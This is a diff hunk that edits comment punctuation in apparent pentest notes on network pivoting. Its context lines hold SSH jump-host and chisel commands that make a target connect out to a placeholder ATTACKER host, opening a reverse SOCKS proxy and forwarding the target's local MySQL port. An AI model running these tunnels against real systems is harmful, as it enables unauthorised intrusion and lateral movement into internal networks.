@@ -70,10 +70,10 @@ ssh -o ProxyCommand="ssh -W %h:%p user1@HOP1" user2@TARGET
 # On attacker (server)
 chisel server --reverse --port 8000
 
-# On target (client) — reverse SOCKS proxy
+# On target (client) - reverse SOCKS proxy
 chisel client ATTACKER:8000 R:1080:socks
 
-# On target — forward specific port
+# On target - forward specific port
 chisel client ATTACKER:8000 R:9999:127.0.0.1:3306
 
 # On attacker, use the proxy
